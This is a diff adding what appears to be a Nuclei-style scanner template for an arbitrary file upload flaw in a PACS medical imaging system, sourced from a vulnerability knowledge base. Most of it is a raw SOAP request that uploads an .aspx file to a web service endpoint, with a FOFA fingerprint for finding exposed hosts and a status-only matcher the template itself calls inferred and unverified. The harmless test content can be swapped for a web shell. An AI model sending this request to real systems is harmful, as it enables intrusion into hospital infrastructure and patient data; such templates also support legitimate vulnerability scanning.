@@ -1,0 +1,52 @@
+id: poc-lwmwsfb8709car8f
+info:
+  name: 英飞达影像存档与通讯(PACS)系统任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lwmwsfb8709car8f
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lwmwsfb8709car8f
+    fofa: web.icon="0cd46e0cba3abd067cd28e70eb7f2a5f"
+http:
+- raw:
+  - 'POST /webservices/WebJobUpload.asmx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: text/xml; charset=utf-8
+
+    Content-Length: length
+
+    SOAPAction: "http://rainier/jobUpload"
+
+
+    <?xml version="1.0" encoding="utf-8"?>
+
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+
+    <soap:Body>
+
+    <jobUpload xmlns="http://rainier">
+
+    <vcode>1</vcode>
+
+    <subFolder></subFolder>
+
+    <fileName>2.aspx</fileName>
+
+    <bufValue>MTIz</bufValue>
+
+    </jobUpload>
+
+    </soap:Body>
+
+    </soap:Envelope>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
